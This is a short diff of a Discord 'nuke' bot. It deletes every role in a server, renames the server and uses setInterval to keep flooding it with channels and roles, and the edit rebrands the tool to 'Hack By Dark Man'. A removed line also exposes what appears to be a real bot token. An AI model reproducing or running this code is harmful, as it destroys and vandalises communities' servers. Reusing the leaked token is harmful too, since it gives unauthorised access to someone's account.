@@ -15,14 +15,15 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("Tanha Agadarman Krdyawa");
+      message.guild.setName("Hack By Dark Man");
       setInterval(function() {
-        message.guild.createChannel(" Hack By Mama Vandam 🦍", "voice");
-        message.guild.createChannel(" Hack By Mama Vandam 🦍", "text");
-        message.guild.createRole({ name: " لەرەی گوورگ" });
+        message.guild.createChannel("By Dark Man", "voice");
+        message.guild.createChannel("By Dark Man", "text");
+        message.guild.createRole({ name: "By Dark Man" });
       });
     }
   }
 });
 
-client.login("ODI2NzM0NzYzMjkyNjIyODg4.YGQyvw.ZMGrey7uAePCF6GlA2GDiWjKbr4");
+client.login("");
+///////By Dark Man\\\\\\\
